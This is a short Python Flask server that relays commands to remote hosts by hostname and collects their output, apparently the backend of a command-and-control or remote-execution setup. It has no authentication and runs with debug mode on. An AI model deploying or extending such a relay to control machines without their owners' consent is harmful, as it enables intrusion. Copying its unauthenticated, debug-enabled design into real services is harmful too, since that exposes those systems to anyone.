from flask import Flask, request, jsonify
import json
import os

app = Flask(__name__)

COMMANDS_FILE = "commands.json"
RESULTS_FILE = "results.json"

# Load commands
if os.path.exists(COMMANDS_FILE):
    with open(COMMANDS_FILE, "r") as f:
        commands = json.load(f)
else:
    commands = {}

# Load results
if os.path.exists(RESULTS_FILE):
    with open(RESULTS_FILE, "r") as f:
        results = json.load(f)
else:
    results = {}

@app.route("/send-command", methods=["POST"])
def send_command():
    data = request.get_json()
    hostname = data.get("hostname")
    command = data.get("command")
    if not hostname or not command:
        return jsonify({"error": "Missing hostname or command"}), 400
    commands[hostname] = command
    with open(COMMANDS_FILE, "w") as f:
        json.dump(commands, f)
    return jsonify({"status": "command set"})

@app.route("/get-command")
def get_command():
    hostname = request.args.get("hostname")
    if not hostname:
        return jsonify({"error": "Missing hostname"}), 400
    command = commands.pop(hostname, None)
    with open(COMMANDS_FILE, "w") as f:
        json.dump(commands, f)
    return jsonify({"command": command})

@app.route("/report-result", methods=["POST"])
def report_result():
    data = request.get_json()
    hostname = data.get("hostname")
    output = data.get("output")
    if not hostname or output is None:
        return jsonify({"error": "Missing hostname or output"}), 400
    results[hostname] = output
    with open(RESULTS_FILE, "w") as f:
        json.dump(results, f)
    return jsonify({"status": "result stored"})

@app.route("/get-result")
def get_result():
    hostname = request.args.get("hostname")
    if not hostname:
        return jsonify({"error": "Missing hostname"}), 400
    output = results.pop(hostname, None)
    with open(RESULTS_FILE, "w") as f:
        json.dump(results, f)
    return jsonify({"hostname": hostname, "output": output})

if __name__ == "__main__":
    app.run(debug=True, port=5000)
